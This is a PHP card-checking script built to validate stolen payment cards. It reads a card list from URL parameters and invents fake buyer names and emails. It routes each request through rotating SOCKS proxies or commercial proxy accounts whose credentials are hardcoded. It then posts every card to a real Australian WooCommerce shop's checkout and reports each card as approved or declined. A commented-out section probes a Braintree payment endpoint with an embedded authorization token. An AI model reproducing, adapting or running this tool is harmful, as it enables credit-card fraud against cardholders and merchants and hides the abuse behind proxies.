<?php

require 'agents.php';



set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');



function GetStr($string, $start, $end)
{
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
extract($_GET);
$lista = str_replace(" " , "", $lista);
$separar = explode("|", $lista);
$cc = $separar[0];
$mes = $separar[1];
$ano = $separar[2];
$cvv = $separar[3];
$binn = substr($cc,0,6);


if(strlen($mes<='09')){
        $mes1=substr($mes,1,2);
    } else {
        $mes1=$mes;
    }
$cc1 = substr($cc,0,4);
$cc2 = substr($cc,4,4);
$cc3 = substr($cc,8,4);
$cc4 = substr($cc,12,4);
$cc5 = substr($cc,0,4);
$cc6 = substr($cc,4,6);
$cc7 = substr($cc,10,5);


if($cbin == "3"){
    $cardnum = "$cc5 $cc6 $cc7";
}else{
   $cardnum = "$cc1 $cc2 $cc3 $cc4";
}

If(strlen($ano) > 2)
{
  $ano1 = substr($ano,2,2);
}
 function value($str,$find_start,$find_end){
$start = @strpos($str,$find_start);
if ($start === false) {
return "";
}
$length = strlen($find_start);
$end    = strpos(substr($str,$start +$length),$find_end);
return trim(substr($str,$start +$length,$end));
}

function mod($dividiendo,$divisor)
{
return round($dividiendo - (floor($dividiendo/$divisor)*$divisor));
}

function cpf($compontos)
{
$n1 = rand(0,9);
$n2 = rand(0,9);
$n3 = rand(0,9);
$n4 = rand(0,9);
$n5 = rand(0,9);
$n6 = rand(0,9);
$n7 = rand(0,9);
$n8 = rand(0,9);
$n9 = rand(0,9);
$d1 = $n9*2+$n8*3+$n7*4+$n6*5+$n5*6+$n4*7+$n3*8+$n2*9+$n1*10;
$d1 = 11 - ( mod($d1,11) );
if ( $d1 >= 10 )
{ $d1 = 0 ;
}
$d2 = $d1*2+$n9*3+$n8*4+$n7*5+$n6*6+$n5*7+$n4*8+$n3*9+$n2*10+$n1*11;
$d2 = 11 - ( mod($d2,11) );
if ($d2>=10) { $d2 = 0 ;}
$retorno = '';
if ($compontos==1) {$retorno = ''.$n1.$n2.$n3.$n4.$n5.$n6.$n7.$n8.$n9.$d1.$d2;}
return $retorno;
}

function datosnombre(){
  $nombre = file("lista_nombres.txt");
    $minombre = rand(0, sizeof($nombre)-1);
    $nombre = $nombre[$minombre];
  return $nombre;
}
function datosapellido(){
  $apellido = file("lista_apellidos.txt");
    $miapellido = rand(0, sizeof($apellido)-1);
    $apellido = $apellido[$miapellido];
  return $apellido;
}


function email($nombre){
  $email = preg_replace('<\W+>', "", $nombre).rand(0000,9999)."@hotmail.com";
  return $email;
}

///$cpf = cpf(1);
$nombre = datosnombre();
$apellido = datosapellido();
// $email = email($nombre);
$zip = substr(str_shuffle(str_repeat("0123456789", 5)), 0, 5);
$idb = substr(str_shuffle(str_repeat("0123456789", 9)), 0, 9);
$username = 'lum-customer-hl_6366aa06-zone-static_res';
$password = 'a9by3kql965v';
$port = 22225;
$session = mt_rand();
$super_proxy = 'zproxy.lum-superproxy.io';

$ad1 = substr(str_shuffle(str_repeat("0123456789", 2)), 0, 2);
$city = substr(str_shuffle(str_repeat("abcdefghijklmnopqrstuvwxyz", 5)), 0, 5);

function ibuuproxy(){
  $poxySocks = file("Socks5.txt");
   $myproxy = rand(0, sizeof($poxySocks)-1);
   $poxySocks = $poxySocks[$myproxy];
 return $poxySocks;
}

$poxySocks5 = ibuuproxy();

$fname = 'Justin'.rand(abcdefghijklmnopqrstuvwxyz,999).'';
$lname = 'Wang';
$email1 = $fname.'.'.$lname.''.rand(10,99999).'@yopmail.com';
 // $email2 = $fname.rand(10,999).'@yopmail.com';
// //$password = 'P@5%Word';
// $password2 = 'Hansabhen1@';
$counters = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);
$counters2 = substr(str_shuffle(str_repeat("0123456789abcdefghijklmopqrstuvxyz", 32)), 0, 32);

$dbtime = substr(str_shuffle(str_repeat("0123456789", 10)), 0, 10);








// curl_close($ch);



// $ch = curl_init();
// curl_setopt($ch, CURLOPT_URL, 'https://api.braintreegateway.com/merchants/2kb2g96kj2gdxjz3/client_api/v1/payment_methods/credit_cards');
// curl_setopt($ch, CURLOPT_HEADER, 0);
// curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
//    curl_setopt($ch, CURLOPT_PROXY, $proxySocks);
//    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// // curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// // curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
// curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
// curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
// curl_setopt($ch, CURLOPT_ENCODING, "gzip, deflate, br");
// curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
// curl_setopt($ch, CURLOPT_HTTPHEADER, array(
// 'Accept: */*',
// 'Accept-Encoding: gzip, deflate, br',
// 'Accept-Language: en-US,en;q=0.9',
// 'Content-Type: application/json',
// 'Host: api.braintreegateway.com',
// 'Origin: https://assets.braintreegateway.com',
// 'Referer: https://assets.braintreegateway.com/web/3.19.0/html/hosted-fields-frame.min.html',
// 'user-agent: '.$browser.''
// ));

// curl_setopt($ch, CURLOPT_POSTFIELDS, '{"_meta":{"merchantAppId":"www.videezy.com","platform":"web","sdkVersion":"3.19.0","source":"hosted-fields","integration":"custom","integrationType":"custom","sessionId":"04c75dbc-508b-44d6-83f1-43573d618b9f"},"creditCard":{"number":"'.$cc.'","cvv":"'.$cvv.'","expiration_month":"'.$mes.'","expiration_year":"'.$ano.'","cardholderName":"Megha SHyam","options":{"validate":false}},"braintreeLibraryVersion":"braintree/web/3.19.0","authorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTIyNDM1MDEsImp0aSI6IjZkMDYwZjIyLTgzNmYtNDJhNC05ZWU4LWVjMDE2MzY0MTY3NSIsInN1YiI6IjJrYjJnOTZrajJnZHhqejMiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IjJrYjJnOTZrajJnZHhqejMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJvcHRpb25zIjp7fX0.zgsA8hTclhmFpQTpmI6HzU52UVx35Cr1Lf0jE_aO1cBvDPow8R8GqCw52cXskGM19VZNUbCjhVYP5ntvxzcpgw"}');


// $b_pago = curl_exec($ch);

// $token = trim(strip_tags(getstr($b_pago,'"nonce":"','"')));
//  $country = trim(strip_tags(getstr($b_pago,'"issuingCountry":"','"')));
//  $bank = trim(strip_tags(getstr($b_pago,'"issuingBank":"','"')));
//  $type = trim(strip_tags(getstr($b_pago,'"debit":"','"')));
//  $category = trim(strip_tags(getstr($a_pago,'"card_category":"','"')));
//  $brand = trim(strip_tags(getstr($a_pago,' "card_brand":"','"')));


  // echo $b_pago;

// echo $token;

// echo $ccnum;
// echo $mes1;
// echo $ano;
// echo $cvv;

// // //////////////////////// START REQUEST 2 ////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://thedancingpixie.com.au/?wc-ajax=checkout');

//////////////////////// PROXY CALLS ////////////////////////////
//               REMOVE '//' FOR PROXIES TO WORK BELOW

//////////////////////// PROXYSCRAPE
// curl_setopt($ch, CURLOPT_PROXY, '199.247.30.187:8080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
//////////////////////// WEBSHARE
// curl_setopt($ch, CURLOPT_PROXY, 'p.webshare.io:1080');
// curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "vxrpebmq-rotate:a0fdakb6ts8a");

//////////////////////// MANUAL Proxy List
curl_setopt($ch, CURLOPT_PROXY, $poxySocks5);
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);// CHANGE TYPE ACCORDING TO LIST

//////////////////////// LUMINATI
// curl_setopt($ch, CURLOPT_PROXY, "http://$super_proxy:$port");
// curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$username-session-$session:$password");
// End Proxy Calls
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
// curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PATCH');
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: application/json, text/javascript, */*; q=0.01',
'accept-encoding: gzip, deflate, br',
'accept-language: en-US,en;q=0.9',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'cookie: yith_wcwl_session_db2c46b8dbbec438aa5cf4837b6b2376=%7B%22session_id%22%3A%22fb0a79154b7b82350d9a1e8ca2c469f5%22%2C%22session_expiration%22%3A1594819394%2C%22session_expiring%22%3A1594815794%2C%22cookie_hash%22%3A%225245bb9d598caa7267b47e9c8ebcfe64%22%7D; wp_woocommerce_session_db2c46b8dbbec438aa5cf4837b6b2376=be1ba5d1b2409a7694ed659c089d615c%7C%7C1592400224%7C%7C1592396624%7C%7C9fa1bb81cd1ee5bf6f1ea868db8a2905; __cfduid=da09392c4b859cf4fc7dcd5273ebc8f161592308826; woocommerce_items_in_cart=1; woocommerce_cart_hash=ddcf44384e699e6adf55f7d18bdb6820',
'origin: https://thedancingpixie.com.au',
'referer: https://thedancingpixie.com.au/checkout/',
'user-agent: '.$browser.''
));

//////////////////////// START POST FILED 1 ////////////////////////

curl_setopt($ch, CURLOPT_POSTFIELDS, 'billing_first_name=Megha&billing_last_name=Shyam&billing_company=&billing_country=AU&billing_address_1=661+STATE+ST&billing_address_2=&billing_city=BINGHAMTON&billing_state=NSW&billing_postcode=2481&billing_phone=%2B61424152415&billing_email=pubgkittu%40gmail.com&account_password=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=AU&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=NSW&shipping_postcode=&order_comments=&gift_wrapping_notes_field=&authority_to_leave_checkbox=1&drop_off_notes=&shipping_method%5B0%5D=flat_rate%3A2&payment_method=anz_egate&anz_egate-card-number='.$cc1.'+'.$cc2.'+'.$cc3.'+'.$cc4.'&anz_egate-card-expiry='.$mes.'+%2F+'.$ano1.'&anz_egate-card-cvc='.$cvv.'&terms=on&terms-field=1&woocommerce-process-checkout-nonce=a0bd123eb7&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review');

// // // // //*****************************************************************************************************************************************************************************************************************************************************************************


$result = curl_exec($ch);
if (curl_errno($ch)) {
    echo 'Error:'.curl_error($ch);
}
curl_close($ch);
$message = trim(strip_tags(getstr($result,'messages":"<ul class=\"woocommerce-error\" role=\"alert\">\n\t\t\t<li>\n\t\t\tPayment failed: ','\t\t<\/li>\n\t<\/ul>\n"')));
// $code = trim(strip_tags(getstr($result,'"errorCode":"','"')));
// // // $message2 = trim(strip_tags(getstr($result,'"message": "','"')));



// // // /////////////////////// RESULT ////////////////////////////////////
if(strpos($result,'"result":"success"')){
// updatecart();
      echo '<tr><td><font size="2"><font color="#00FF00">#Aprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">[ '.$result.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
    }
elseif(strpos($result,'Not Acceptable!')) {

            echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [E R R O R]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';

  }

else {
              echo '<tr><td><font size="2"><font color="#FF0000">#Reprovada </font></td><td>&nbsp;&nbsp;&nbsp;<font size="2"><font color="#C0C0C0">'.$lista.'</font></td><td><font></font><td><font size="2">&nbsp;&nbsp;&nbsp;<b><font color="#FFDF00">  [ '.$message.' ]&nbsp;&nbsp;&nbsp;<font size="0.5"><font color="#0086ff"> '.$country.' | '.$bank.' | Debit- '.$type.' </font></b></font></td></tr>';
  }
curl_close($curl);
ob_flush();
     // echo $result;
//echo $browser;
?>
